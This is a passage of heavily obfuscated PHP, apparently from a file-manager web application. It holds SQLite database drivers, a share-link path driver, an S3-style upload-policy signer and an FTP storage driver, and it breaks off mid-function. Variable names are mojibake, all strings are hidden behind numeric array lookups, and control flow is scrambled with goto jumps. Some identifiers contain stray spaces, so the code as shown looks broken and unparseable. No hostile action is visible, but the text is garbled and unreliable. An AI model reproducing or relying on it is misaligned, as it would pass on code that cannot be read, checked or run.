$_SERVER[úÎü]; $cÇÁ‹‰Â¿é = $this->query($DÜ¶ƒ†„á[42] . $DÜ¶ƒ†„á[43] . $DÜ¶ƒ†„á[44]); $B²Ç÷’Ê›Œ = array(); foreach ($cÇÁ‹‰Â¿é as $DíŒ‘õÌéÊ => $B×§ï¹­ãˆ) { $B²Ç÷’Ê›Œ[$DíŒ‘õÌéÊ] = current($B×§ï¹­ãˆ); } return $B²Ç÷’Ê›Œ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $EŒæ²²£·† =& $_SERVER[úÎü]; $E…Á‚öŒØ² = sqlite_last_error($this->_linkID); $this->error = $E…Á‚öŒØ² . $EŒæ²²£·†[4] . sqlite_error_string($E…Á‚öŒØ²); if ($EŒæ²²£·†[33] != $this->queryStr) { $this->error .= LNG($EŒæ²²£·†[45]) . $this->queryStr; } think_trace($this->error, $EŒæ²²£·†[33], $EŒæ²²£·†[46]); return $this->error; } public function escapeString($Eò‘àğµö) { return sqlite_escape_string($Eò‘àğµö); } public function parseLimit($aÊ´¯ªÕ) { $fíŞµÄÁ‰· =& $_SERVER[úÎü]; $Eº‚›ğº‰ = $fíŞµÄÁ‰·[33]; if (!empty($aÊ´¯ªÕ)) { $aÊ´¯ªÕ = explode($fíŞµÄÁ‰·[47], $aÊ´¯ªÕ); if (count($aÊ´¯ªÕ) > 1) { $Eº‚›ğº‰ .= $fíŞµÄÁ‰·[48] . $aÊ´¯ªÕ[1] . $fíŞµÄÁ‰·[49] . $aÊ´¯ªÕ[0] . $fíŞµÄÁ‰·[50]; } else { $Eº‚›ğº‰ .= $fíŞµÄÁ‰·[48] . $aÊ´¯ªÕ[0] . $fíŞµÄÁ‰·[50]; } } return $Eº‚›ğº‰; } } class DbSqlite3Base extends Db { public function __construct($fÃ½œÃÃÇî = '') { $D–‹—Ë´ãà =& $_SERVER[úÎü]; if (!class_exists($D–‹—Ë´ãà[51])) { think_exception(think_lang($D–‹—Ë´ãà[10]) . $D–‹—Ë´ãà[52]); } if (!empty($fÃ½œÃÃÇî)) { if (!isset($fÃ½œÃÃÇî[$D–‹—Ë´ãà[12]])) { $fÃ½œÃÃÇî[$D–‹—Ë´ãà[12]] = 438; } $this->config = $fÃ½œÃÃÇî; if (empty($this->config[$D–‹—Ë´ãà[13]])) { $this->config[$D–‹—Ë´ãà[13]] = array(); } } } public function connect($CôïÓÆã… = '', $E©ò Ó‡Ó = 0) { $D¬Å¢’›õï =& $_SERVER[úÎü]; if (!isset($this->linkID[$E©ò Ó‡Ó])) { if (empty($CôïÓÆã…)) { $CôïÓÆã… = $this->config; } $this->linkID[$E©ò Ó‡Ó] = new SQLite3($CôïÓÆã…[$D¬Å¢’›õï[17]]); if (!$this->linkID[$E©ò Ó‡Ó]) { think_exception($this->linkID[$E©ò Ó‡Ó]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E©ò Ó‡Ó]->busyTimeout(30000); if (1 != think_config($D¬Å¢’›õï[18])) { unset($this->config); } } return $this->linkID[$E©ò Ó‡Ó]; } public function free() { $this->queryID = null; } public function query($A‘È½¶İƒğ) { goto f¬¹ÉÜÍª™; cêÄ‰Ë°ÊÛ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bŒ¤­Ñêšå = $this->getAll(); $this->numRows = count($bŒ¤­Ñêšå); return $bŒ¤­Ñêšå; } goto f„£Ê“ Ëó; f¬¹ÉÜÍª™: $A«ØŒÓ”Ï =& $_SERVER[úÎü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C‹„Ÿô°Õ ; C‹„Ÿô°Õ : $this->queryStr = $A‘È½¶İƒğ; if ($this->queryID) { $this->free(); } think_action_status($A«ØŒÓ”Ï[19], 1); goto C¹‡¿ãí¸; C¹‡¿ãí¸: think_status($A«ØŒÓ”Ï[20]); $this->queryID = $this->_linkID->query($A‘È½¶İƒğ); $this->debug(); goto cêÄ‰Ë°ÊÛ; f„£Ê“ Ëó: } public function execute($côŒ–ÄÂô¸) { goto E“Û£ãµªÍ; bèÃÕÔ§Æä: if (!1 === $D­Ö¦Ñ¶ëò) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto aø³„•ÉŒí; Fˆìø±¬Ó÷: $this->queryStr = $côŒ–ÄÂô¸; if ($this->queryID) { $this->free(); } think_action_status($EÏ„ºõ¢Ô[21], 1); goto bö°“øÇ‰Î; E“Û£ãµªÍ: $EÏ„ºõ¢Ô =& $_SERVER[úÎü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fˆìø±¬Ó÷; bö°“øÇ‰Î: think_status($EÏ„ºõ¢Ô[20]); $D­Ö¦Ñ¶ëò = $this->_linkID->exec($côŒ–ÄÂô¸); $this->debug(); goto bèÃÕÔ§Æä; aø³„•ÉŒí: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[úÎü][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eƒ–°ŞğÈ‡ = $this->_linkID->query($_SERVER[úÎü][23]); if (!$eƒ–°ŞğÈ‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C°¶ø­æ‡ï = $this->_linkID->query($_SERVER[úÎü][24]); if (!$C°¶ø­æ‡ï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C…Å™¸˜É = array(); while ($fÈë·Ïìñ‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $C…Å™¸˜É[] = $fÈë·Ïìñ‰; } $this->queryID->reset(); return $C…Å™¸˜É; } public function getFields($eº•×ÏÙ¥) { $CÔ®ëÕƒ  =& $_SERVER[úÎü]; $Aô‘Ì˜††ê = $this->query($CÔ®ëÕƒ [25] . $eº•×ÏÙ¥ . $CÔ®ëÕƒ [26]); $Aí‘Ï²”Ë” = array(); if ($Aô‘Ì˜††ê) { foreach ($Aô‘Ì˜††ê as $E¢¾ÌÓ¾ö => $eˆ ³ˆóë) { $Aí‘Ï²”Ë”[$eˆ ³ˆóë[$CÔ®ëÕƒ [28]]] = array($CÔ®ëÕƒ [28] => $eˆ ³ˆóë[$CÔ®ëÕƒ [28]], $CÔ®ëÕƒ [29] => $eˆ ³ˆóë[$CÔ®ëÕƒ [29]], $CÔ®ëÕƒ [31] => (bool) ($eˆ ³ˆóë[$CÔ®ëÕƒ [31]] === $CÔ®ëÕƒ [33]), $CÔ®ëÕƒ [34] => $eˆ ³ˆóë[$CÔ®ëÕƒ [53]], $CÔ®ëÕƒ [36] => (bool) $eˆ ³ˆóë[$CÔ®ëÕƒ [54]], $CÔ®ëÕƒ [39] => (bool) $eˆ ³ˆóë[$CÔ®ëÕƒ [54]]); } } return $Aí‘Ï²”Ë”; } public function getTables($FÓ¹â®™Êƒ = '') { $f™Œ‡÷²¼¡ =& $_SERVER[úÎü]; $BÔ¶Íˆñğ¥ = $this->query($f™Œ‡÷²¼¡[42] . $f™Œ‡÷²¼¡[43] . $f™Œ‡÷²¼¡[44]); $D“¦Ÿ‰®İ­ = array(); foreach ($BÔ¶Íˆñğ¥ as $c»çÄøçê³ => $dœÁÀ‡•È®) { $D“¦Ÿ‰®İ­[$c»çÄøçê³] = current($dœÁÀ‡•È®); } return $D“¦Ÿ‰®İ­; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EÓµéÈ™ğ =& $_SERVER[úÎü]; $this->error = $this->_linkID->lastErrorMsg(); if ($EÓµéÈ™ğ[33] != $this->queryStr) { $this->error .= LNG($EÓµéÈ™ğ[45]) . $this->queryStr; } think_trace($this->error, $EÓµéÈ™ğ[33], $EÓµéÈ™ğ[46]); return $this->error; } public function escapeString($B•¤ô†˜´ó) { $EÙ…Ù×‘¶İ =& $_SERVER[úÎü]; if ($this->_linkID) { return $this->_linkID->escapeString($B•¤ô†˜´ó); } return str_ireplace($EÙ…Ù×‘¶İ[55], $EÙ…Ù×‘¶İ[56], $B•¤ô†˜´ó); } public function parseLimit($E±¨ÜŒ¼©) { $D…ÓŸÍ¨¸Î =& $_SERVER[úÎü]; $f¦ó¯ã¢Ë’ = $D…ÓŸÍ¨¸Î[33]; if (!empty($E±¨ÜŒ¼©)) { $E±¨ÜŒ¼© = explode($D…ÓŸÍ¨¸Î[47], $E±¨ÜŒ¼©); if (count($E±¨ÜŒ¼©) > 1) { $f¦ó¯ã¢Ë’ .= $D…ÓŸÍ¨¸Î[48] . $E±¨ÜŒ¼©[1] . $D…ÓŸÍ¨¸Î[49] . $E±¨ÜŒ¼©[0] . $D…ÓŸÍ¨¸Î[50]; } else { $f¦ó¯ã¢Ë’ .= $D…ÓŸÍ¨¸Î[48] . $E±¨ÜŒ¼©[0] . $D…ÓŸÍ¨¸Î[50]; } } return $f¦ó¯ã¢Ë’; } } goto c§”ª°ÕİÂ; dÍôĞà‡¶É: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cª¡¥‚±’) { $this->pathParse = $cª¡¥‚±’; } protected function infoParse($a¦ˆê¨ÎÄŠ, $Ağ…°¡™’ø = false) { $Dßï¶æğç =& $_SERVER[úÎü]; return Action($Dßï¶æğç[1030])->sharePathInfo($this->pathParse[$Dßï¶æğç[75]], !0, $Ağ…°¡™’ø); } public function listPath($EÍÓ¡…Ü‰™, $b¾®…îÅù‚ = false) { $fö˜ÓÂÂŒ =& $_SERVER[úÎü]; $fˆîŸ¨Ã· = IO::listPath($EÍÓ¡…Ü‰™, $b¾®…îÅù‚); foreach ($fˆîŸ¨Ã· as $E‡ùƒ‚„ª => $Ağ–‰¶¾Ü) { if (!in_array($E‡ùƒ‚„ª, array($fö˜ÓÂÂŒ[73], $fö˜ÓÂÂŒ[74]))) { continue; } foreach ($Ağ–‰¶¾Ü as $FÌÇ½‰İ‹Í => $a‚š²øäÓ¥) { $a‚š²øäÓ¥ = Action($fö˜ÓÂÂŒ[1178])->parsePathChildren($a‚š²øäÓ¥, array($fö˜ÓÂÂŒ[403] => $EÍÓ¡…Ü‰™)); $fˆîŸ¨Ã·[$E‡ùƒ‚„ª][$FÌÇ½‰İ‹Í] = Action($fö˜ÓÂÂŒ[1030])->shareItemInfo($a‚š²øäÓ¥); } } return $fˆîŸ¨Ã·; } public function listAll($BÖøÜœ) { $B†¤äï´Ê° =& $_SERVER[úÎü]; $C›³Ú¤ˆÃ = IO::listAll($BÖøÜœ); foreach ($C›³Ú¤ˆÃ as &$EØ¹¥ ‚áµ) { $EØ¹¥ ‚áµ = array_merge(IO::info($EØ¹¥ ‚áµ[$B†¤äï´Ê°[75]]), $EØ¹¥ ‚áµ); $EØ¹¥ ‚áµ[$B†¤äï´Ê°[407]] = Action($B†¤äï´Ê°[1030])->shareItemInfo($EØ¹¥ ‚áµ); } unset($EØ¹¥ ‚áµ); return $C›³Ú¤ˆÃ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($b•æë‹¢ÃŠ) { parent::__construct($b•æë‹¢ÃŠ); $this->signatureVersion($_SERVER[úÎü][208]); } public function uploadFormData($dÉ¥Ï™±Ö‹, $E³Ô‚‡è•‘ = 3600) { goto BëÖŒ‚å; A¦Öó¹ó‰: $a¾ÓÂÈ˜Åˆ = $aöˆ¾æ„Œ[59]; $Fãñõˆ¯¤‹ = gmdate($aöˆ¾æ„Œ[1180]); $CÂÙƒ›¨ö = gmdate($aöˆ¾æ„Œ[691]); goto e à†¥¸‡ö; BëÖŒ‚å: $aöˆ¾æ„Œ =& $_SERVER[úÎü]; $aèİ—³¿øÚ = $aöˆ¾æ„Œ[189]; $CÂµ¹Ôï´é = $aöˆ¾æ„Œ[1179]; goto A¦Öó¹ó‰; bİÎ×†¸Ñò: $e¨À×ª—º° = array($this->accessKey, $CÂÙƒ›¨ö, $this->region, $a¾ÓÂÈ˜Åˆ, $Bš»µø¼Ä«); $B³›±‘¡¡Ø = implode($aöˆ¾æ„Œ[8], $e¨À×ª—º°); $e­ñëÊŠÏ = array($aöˆ¾æ„Œ[1147] => gmdate($aöˆ¾æ„Œ[1146], strtotime($aöˆ¾æ„Œ[1182])), $aöˆ¾æ„Œ[1148] => array(array($aöˆ¾æ„Œ[1150] => $this->bucket), array($aöˆ¾æ„Œ[1149] => $aèİ—³¿øÚ), array($aöˆ¾æ„Œ[1151], $aöˆ¾æ„Œ[1152], $aöˆ¾æ„Œ[33]), array($aöˆ¾æ„Œ[1151], $aöˆ¾æ„Œ[1183], $aöˆ¾æ„Œ[33]), array($aöˆ¾æ„Œ[1151], $aöˆ¾æ„Œ[1184], $aöˆ¾æ„Œ[33]), array($aöˆ¾æ„Œ[1153] => $BîÑ†İß‹), array($aöˆ¾æ„Œ[1185] => $B³›±‘¡¡Ø), array($aöˆ¾æ„Œ[1186] => $CÂµ¹Ôï´é), array($aöˆ¾æ„Œ[1187] => $Fãñõˆ¯¤‹), array($aöˆ¾æ„Œ[1188] => $e“ÏÖŒå“ø))); goto e‹ö£¨‡Éİ; cõ¶È¼ğº›: $d½“†´öÄ¿ = hash_hmac($aöˆ¾æ„Œ[1189], $a¾ÓÂÈ˜Åˆ, $cò•‰‘å¸Ü, !0); $a§ÅÓÒÎµ  = hash_hmac($aöˆ¾æ„Œ[1189], $Bš»µø¼Ä«, $d½“†´öÄ¿, !0); $FÙ¤¾ìÏ‘¯ = hash_hmac($aöˆ¾æ„Œ[1189], $CİŞÜÓŠâƒ, $a§ÅÓÒÎµ ); goto A—ğ«‡—Ï®; A—ğ«‡—Ï®: $cŞõèˆœÀæ = array($aöˆ¾æ„Œ[207] => $aöˆ¾æ„Œ[33], $aöˆ¾æ„Œ[1191] => $aöˆ¾æ„Œ[33], $aöˆ¾æ„Œ[1149] => $aèİ—³¿øÚ, $aöˆ¾æ„Œ[1153] => $BîÑ†İß‹, $aöˆ¾æ„Œ[1157] => $CİŞÜÓŠâƒ, $aöˆ¾æ„Œ[1192] => $B³›±‘¡¡Ø, $aöˆ¾æ„Œ[1193] => $CÂµ¹Ôï´é, $aöˆ¾æ„Œ[1194] => $Fãñõˆ¯¤‹, $aöˆ¾æ„Œ[1195] => $e“ÏÖŒå“ø, $aöˆ¾æ„Œ[1196] => $FÙ¤¾ìÏ‘¯, $aöˆ¾æ„Œ[173] => $this->getHost()); return $cŞõèˆœÀæ; goto eæÚÔÂ±Ø°; e‹ö£¨‡Éİ: $CİŞÜÓŠâƒ = base64_encode(json_encode($e­ñëÊŠÏ)); $AÔĞ„ôœ…Ú = hash_hmac($aöˆ¾æ„Œ[1189], $CÂÙƒ›¨ö, $aöˆ¾æ„Œ[1190] . $this->secret, !0); $cò•‰‘å¸Ü = hash_hmac($aöˆ¾æ„Œ[1189], $this->region, $AÔĞ„ôœ…Ú, !0); goto cõ¶È¼ğº›; e à†¥¸‡ö: $Bš»µø¼Ä« = $aöˆ¾æ„Œ[1181]; $e“ÏÖŒå“ø = $E³Ô‚‡è•‘ . $aöˆ¾æ„Œ[33]; $BîÑ†İß‹ = $aöˆ¾æ„Œ[1145]; goto bİÎ×†¸Ñò; eæÚÔÂ±Ø°: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($b­Ğ“àÔç) { parent::__construct(); if (count($b­Ğ“àÔç) > 0) { $this->_init($b­Ğ“àÔç); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($d¹õ‘ÕÉëº) { $C˜’°Ñù°Œ =& $_SERVER[úÎü]; global $config; $this->appCharset = $config[$C˜’°Ñù°Œ[1197]]; $this->systemCharset = $config[$C˜’°Ñù°Œ[1198]]; if (isset($d¹õ‘ÕÉëº[$C˜’°Ñù°Œ[1199]]) && $d¹õ‘ÕÉëº[$C˜’°Ñù°Œ[1199]]) { $this->systemCharset = $d¹õ‘ÕÉëº[$C˜’°Ñù°Œ[1199]]; } } public function iconvApp($fë·Ÿñï¨«) { return $this->iconvTo($fë·Ÿñï¨«, $this->systemCharset, $this->appCharset); } public function iconvSystem($FÅàÅê‡¶¦) { return $this->iconvTo($FÅàÅê‡¶¦, $this->appCharset, $this->systemCharset); } public function getPathOuter($AÓÓÒÇ“È) { goto D‰„Í›ØÑ; AĞí¥ïÙã®: return $this->pathDriver . $EÕÜ è˜ÖÒ[8] . ltrim($AÓÓÒÇ“È, $EÕÜ è˜ÖÒ[8]); goto E¨ƒ˜–Ó¡; AÁÀîÔæÖ: if (substr($CŞô–¾™Õ¦, 0, 2) == $EÕÜ è˜ÖÒ[1200]) { $CŞô–¾™Õ¦ = BASIC_PATH . substr($CŞô–¾™Õ¦, 2); } if (substr($AÓÓÒÇ“È, 0, 2) == $EÕÜ è˜ÖÒ[1200]) { $AÓÓÒÇ“È = BASIC_PATH . substr($AÓÓÒÇ“È, 2); } $CŞô–¾™Õ¦ = KodIO::clear($CŞô–¾™Õ¦); goto DêœÓ—÷óä; D‰„Í›ØÑ: $EÕÜ è˜ÖÒ =& $_SERVER[úÎü]; $CŞô–¾™Õ¦ = $this->iconvApp($this->pathBase); $AÓÓÒÇ“È = $this->iconvApp($AÓÓÒÇ“È); goto AÁÀîÔæÖ; DêœÓ—÷óä: $AÓÓÒÇ“È = KodIO::clear($AÓÓÒÇ“È); $AÓÓÒÇ“È = substr($AÓÓÒÇ“È, strlen($CŞô–¾™Õ¦)); if (empty($this->pathDriver)) { return $AÓÓÒÇ“È; } goto AĞí¥ïÙã®; E¨ƒ˜–Ó¡: } private function _init($BŒ¤Ÿñ¥“ = array()) { $D«Ã£³“Àä =& $_SERVER[úÎü]; if (!function_exists($D«Ã£³“Àä[1201])) { throw new Exception(LNG($D«Ã£³“Àä[1202])); } $this->config = $BŒ¤Ÿñ¥“; $this->charsetReset($BŒ¤Ÿñ¥“); foreach ($BŒ¤Ÿñ¥“ as $b«çšÇ¶Š => $Dà‘¶¨Ä¿˜) { if (isset($this->{$b«çšÇ¶Š})) { $this->{$b«çšÇ¶Š} = $Dà‘¶¨Ä¿˜; } } return $this->_login($BŒ¤Ÿñ¥“); } private function _login($b‹òÌŒ‘‚ ) { goto A¬èº™–†; A¬èº™–†: $B×¡ «Úé´ =& $_SERVER[úÎü]; static $Fâ—”¹ŞÜÁ = array(); $a‰Æ‡©ˆ§° = md5(json_encode($b‹òÌŒ‘‚ )); goto c˜Ï‘Ñ¯§à; c˜Ï‘Ñ¯§à: if (isset($Fâ—”¹ŞÜÁ[$a‰Æ‡©ˆ§°])) { foreach ($Fâ—”¹ŞÜÁ[$a‰Æ‡©ˆ§°] as $FÈùëİ© => $bğ±ˆ§åÓË) { $this->{$FÈùëİ©} = $bğ±ˆ§åÓË; } return !0; } $B®£ó¼¼˜§ = parse_url(trim($this->server, $B×¡ «Úé´[8])); $this->host = $B®£ó¼¼˜§[$B×¡ «Úé´[173]]; goto eÅÁ¿»á; eƒÉ¸¾Åçî: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $eÑÀŞÚ¿‚ö = @ftp_login($this->connect, $this->username, $this->userpass); goto AâÂóº²àƒ; d—®Ï¹›Å•: $Fâ—”¹ŞÜÁ[$a‰Æ‡©ˆ§°] = array($B×¡ «Úé´[1206] => $this->connect, $B×¡ «Úé´[173] => $this->host, $B×¡ «Úé´[172] => $this->scheme, $B×¡ «Úé´[174] => $this->port); return $eÑÀŞÚ¿‚ö; goto AñÇã…ĞÕÂ; AâÂóº²àƒ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $d‡§”‡«–‰ = $this->pasv == $B×¡ «Úé´[83] ? !0 : !1; @ftp_pasv($this->connect, $d‡§”‡«–‰); goto d—®Ï¹›Å•; eÅÁ¿»á: $BÒ…ï¶‘ó¸ = isset($B®£ó¼¼˜§[$B×¡ «Úé´[172]]) && $B®£ó¼¼˜§[$B×¡ «Úé´[172]] == $B×¡ «Úé´[1203] ? !0 : !1; $this->scheme = $BÒ…ï¶‘ó¸ ? $B×¡ «Úé´[1204] : $B×¡ «Úé´[1205]; $this->port = isset($B®£ó¼¼˜§[$B×¡ «Úé´[174]]) ? $B®£ó¼¼˜§[$B×¡ «Úé´[174]] : 21; goto eƒÉ¸¾Åçî; AñÇã…ĞÕÂ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($BäÜ±«‹åÎ, $föÍ”ºòÇ = '', $A©ñ–‹ğÔè = REPEAT_RENAME) { if ($this->setContent($BäÜ±«‹åÎ, $föÍ”ºòÇ)) { return $this->getPathOuter($BäÜ±«‹åÎ); } return !1; } public function mkdir($c½ÇŸŠ, $eÅö‡ÑÃ£™ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $c½ÇŸŠ = $this->iconvSystem($c½ÇŸŠ); if ($this->_isFolder($c½ÇŸŠ) || @ftp_mkdir($this->connect, $c½ÇŸŠ)) { return $this->getPathOuter($c½ÇŸŠ); } if (!$this->mkdir($this->pathFather($c½ÇŸŠ))) { return !1; } if ($c½ÇŸŠ = @ftp_mkdir($this->connect, $c½ÇŸŠ)) { return $this->getPathOuter($c½ÇŸŠ); } return !1; } public function copyFile($C¿ˆšÂ×ìø, $CÑ©–¶Å†˜) { goto A¯‰„œ¸Îö; CƒŞ…¶½¡…: $this->tempFileRemve($f…ˆ·ßÕ¢); return $AæˆÙêƒ‰•; goto AÕèç°–ãĞ; A¯‰„œ¸Îö: if (!$this->_isconn()) { return !1; } $F²šˆ÷ŞÂ = $this->pathThis($this->iconvSystem($C¿ˆšÂ×ìø)); $f…ˆ·ßÕ¢ = $this->tempFile($F²šˆ÷ŞÂ); goto B‡ªª÷š’õ; B‡ªª÷š’õ: $e·®ëÓ™ï° = $this->iconvApp($f…ˆ·ßÕ¢); $this->download($C¿ˆšÂ×ìø, $e·®ëÓ™ï°); $AæˆÙêƒ‰• = $this->upload($CÑ©–¶Å†˜, $e·®ëÓ™ï°); goto CƒŞ…¶½¡…; AÕèç°–ãĞ: } public function moveFile($A’ ÍÍĞÌ, $dÚÏÂ’óÂ¦) { if (!$this->_isconn()) { return !1; } $A’ ÍÍĞÌ = $this->iconvSystem($A’ ÍÍĞÌ); $dÚÏÂ’óÂ¦ = $this->iconvSystem($dÚÏÂ’óÂ¦); $Eä±¾‘èœ = @ftp_rename($this->connect, $A’ ÍÍĞÌ, $dÚÏÂ’óÂ¦); return $Eä±¾‘èœ ? $this->getPathOuter($dÚÏÂ’óÂ¦) : !1; } public function delFile($aÖÈàå¨¢…) { if (!$this->_isconn()) { return !1; } $aÖÈàå¨¢… = $this->iconvSystem($aÖÈàå¨¢…); return @ftp_delete($this->connect, $aÖÈàå¨¢…); } public function delFolder($aÒ´ÅÙ«Úƒ) { goto C¡¸æµæÈ; fºÄ™™ö¦ : $this->fileList($aÒ´ÅÙ«Úƒ, $aÏâ¶¦“, $BÄ¤ùÅ¶ò, !0); $this->listItemCache = !0; foreach ($BÄ¤ùÅ¶ò as $AÑÃ”Ô°®Ü) { $EŠèé‚òÂÜ = $this->iconvSystem($AÑÃ”Ô°®Ü[$_SERVER[úÎü][28]]); $BœªÙ½ÁÖ = @ftp_delete($this->connect, $EŠèé‚òÂÜ); if (!$BœªÙ½ÁÖ) { return !1; } } goto EŒ‰è‹ªÔ˜; C¡¸æµæÈ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $aÏâ¶¦“ = $BÄ¤ùÅ¶ò = array(); goto fºÄ™™ö¦ ; EŒ‰è‹ªÔ˜: foreach ($aÏâ¶¦“ as $EŠèé‚òÂÜ) { $EŠèé‚òÂÜ = $this->iconvSystem($EŠèé‚òÂÜ); $BœªÙ½ÁÖ = @ftp_rmdir($this->connect, $EŠèé‚òÂÜ); if (!$BœªÙ½ÁÖ) { return !1; } } $aÒ´ÅÙ«Úƒ = $this->iconvSystem($aÒ´ÅÙ«Úƒ); return @ftp_rmdir($this->connect, $aÒ´ÅÙ«Úƒ); goto A¸‰Úƒ Ñ; A¸‰Úƒ Ñ: } public function rename($E¹ÚÒ‹ñÇ’, $cÙ›ÇÊŒè) { goto c…†öØŞÃ¯; Fø×©™Œ«: $C„ÅĞÈ˜‰ = rtrim($eŸ˜¸…“ª, $c†ç‡¹§Òê[8]) . $c†ç‡¹§Òê[8] . $c‚ê½‚Æ–Ê; $a§æÍº…•ï = @ftp_rename($this->connect, $E¹ÚÒ‹ñÇ’, $C„ÅĞÈ˜‰); $C„ÅĞÈ˜‰ = $this->iconvApp($C„ÅĞÈ˜‰); goto aÈêòÀÊğƒ; aÈêòÀÊğƒ: return $a§æÍº…•ï ? $this->getPathOuter($C„ÅĞÈ˜‰) : !1; goto E²ƒÚĞ‚°İ; c…†öØŞÃ¯: $c†ç‡¹§Òê =& $_SERVER[úÎü]; if (!$this->_isconn()) { return !1; } $c‚ê½‚Æ–Ê = $this->fileNameAuto($this->pathFather($E¹ÚÒ‹ñÇ’), $cÙ›ÇÊŒè); goto BÍ›—×’ˆ‚; BÍ›—×’ˆ‚: $c‚ê½‚Æ–Ê = $this->iconvSystem($c‚ê½‚Æ–Ê); $E¹ÚÒ‹ñÇ’ = $this->iconvSystem($E¹ÚÒ‹ñÇ’); $eŸ˜¸…“ª = $this->pathFather($E¹ÚÒ‹ñÇ’); goto Fø×©™Œ«; E²ƒÚĞ‚°İ: } private function folderInfo($eŒ•ì½—, $fãÅ‡ÈÀ½Ù = false) { $cØ˜§›‚­ =& $_SERVER[úÎü]; $fÎ‡³–‰ç° = array($cØ˜§›‚­[28] => $this->pathThis($eŒ•ì½—), $cØ˜§›‚­[75] => $this->getPathOuter($cØ˜§›‚­[8] . $eŒ•ì½—), $cØ˜§›‚­[29] => $cØ˜§›‚­[76]); if ($fãÅ‡ÈÀ½Ù) { return $fÎ‡³–‰ç°; } $fÎ‡³–‰ç°[$cØ˜§›‚­[190]] = $fÎ‡³–‰ç°[$cØ˜§›‚­[107]] = 0; $fÎ‡³–‰ç°[$cØ˜§›‚­[191]] = $fÎ‡³–‰ç°[$cØ˜§›‚­[192]] = !0; return $fÎ‡³–‰ç°; } private function fileInfo($BŒ”¤®¢™, $eğ¾«ÃÚŞñ = false, $C›‹‘Å¢îã = array()) { goto eÓĞŒ†³±; b´êß…Í½: $e„ÆŞ™•İß[$FĞï…Çõ‹¨[107]] = @ftp_mdtm($this->connect, $b÷—¶‘ˆÁ); if (empty($C›‹‘Å¢îã)) { $C›‹‘Å¢îã = $this->objectMeta($BŒ”¤®¢™); if (!$C›‹‘Å¢îã) { return $e„ÆŞ™•İß; } } $e„ÆŞ™•İß[$FĞï…Çõ‹¨[77]] = $C›‹‘Å¢îã[$FĞï…Çõ‹¨[77]]; goto D©šŠßÂ½; eÓĞŒ†³±: $FĞï…Çõ‹¨ =& $_SERVER[úÎü]; $e„ÆŞ™•İß = array($FĞï…Çõ‹¨[28] => $this->pathThis($BŒ”¤®¢™), $FĞï…Çõ‹¨[75] => $this->getPathOuter($FĞï…Çõ‹¨[8] . $BŒ”¤®¢™), $FĞï…Çõ‹¨[29] => $FĞï…Çõ‹¨[171], $FĞï…Çõ‹¨[77] => isset($C›‹‘Å¢îã[$FĞï…Çõ‹¨[77]]) ? $C›‹‘Å¢îã[$FĞï…Çõ‹¨[77]] : 0, $FĞï…Çõ‹¨[165] => $this->ext($BŒ”¤®¢™)); if ($eğ¾«ÃÚŞñ) { return $e„ÆŞ™•İß; } goto a‰¾„ãª×; a‰¾„ãª×: $e„ÆŞ™•İß[$FĞï…Çõ‹¨[190]] = $e„ÆŞ™•İß[$FĞï…Çõ‹¨[107]] = 0; $e„ÆŞ™•İß[$FĞï…Çõ‹¨[191]] = $e„ÆŞ™•İß[$FĞï…Çõ‹¨[192]] = !0; $b÷—¶‘ˆÁ = $this->iconvSystem($BŒ”¤®¢™); goto b´êß…Í½; D©šŠßÂ½: return $e„ÆŞ™•İß; goto CóÌÃ¬…ß; CóÌÃ¬…ß: } public function size($c«İœã—£…) { $a£›ô„Ú¯š = $this->objectMeta($c«İœã—£…); return $a£›ô„Ú¯š ? $a£›ô„Ú¯š[$_SERVER[úÎü][77]] : 0; } public function info($dä¿‘‹Ü†²) { if ($this->isFile($dä¿‘‹Ü†²)) { return $this->fileInfo($dä¿‘‹Ü†², 0); } else { if ($this->isFolder($dä¿‘‹Ü†²)) { return $this->folderInfo($dä¿‘‹Ü†²); } } return !1; } private function fileList($DÛÏ®‹øøÂ, &$D›‹ˆŞº„à, &$Dïˆƒê¢ó°, $d»ÈÓê†™¹ = false) { goto eç¶ÜóÕá”; e¾‘Äôùï: $bºİä«¼á± = array($aç‘¸±äİ[91] => 1, $aç‘¸±äİ[1207] => 1); foreach ($DèÓ…‘¼¡æ as $Bãİ¬˜ç«) { goto Cí˜Œ˜Ãšï; eÂŒö©ĞàŸ: if (substr($Bãİ¬˜ç«, 0, 1) == $aç‘¸±äİ[1208]) { $aµ¿†ù©[$aç‘¸±äİ[29]] = $aç‘¸±äİ[76]; $aµ¿†ù©[$aç‘¸±äİ[77]] = 0; } $CºçˆÈîÑŸ = $aµ¿†ù©[$aç‘¸±äİ[29]] == $aç‘¸±äİ[76] ? !0 : !1; if ($câ²œĞ‰­×) { $this->cacheMethod($aç‘¸±äİ[195], $a©šé †ƒ·, $CºçˆÈîÑŸ); $this->cacheMethod($aç‘¸±äİ[196], $a©šé †ƒ·, $aµ¿†ù©); } goto AóÃ”Éè®ì; AóÃ”Éè®ì: if ($CºçˆÈîÑŸ) { $D›‹ˆŞº„à[] = $a©šé †ƒ·; if ($d»ÈÓê†™¹) { 